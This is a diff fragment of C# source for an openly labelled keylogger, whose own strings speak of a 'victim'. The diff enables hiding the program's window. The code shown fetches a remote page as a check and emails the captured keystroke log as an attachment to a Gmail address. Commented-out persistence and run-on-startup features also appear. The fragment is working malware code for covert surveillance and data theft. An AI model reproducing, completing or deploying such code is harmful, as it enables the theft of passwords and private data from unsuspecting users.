@@ -35,7 +35,7 @@ namespace Karios
                     string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
                     if (!webData.ToUpperInvariant().Contains("Keyonline"))
                     // Hide the window
-                    //ShowWindow(handle, SW_HIDE);
+                    ShowWindow(handle, SW_HIDE);
                     // Persitance feature
                     //Duplicate(); 
                     // Run on startup 
@@ -102,7 +102,7 @@ namespace Karios
                         mail.From = new MailAddress("GINGIRULES@gmail.com");
                         mail.To.Add("GINGIRULES@gmail.com");
                         mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                        mail.Body = "New kelogging file from victim (" + GetLocalIP(LocalIP) + ") , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
+                        mail.Body = "New kelogging file from victim () , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
 
                         Attachment attachment;
                         attachment = new Attachment(pathToLog);
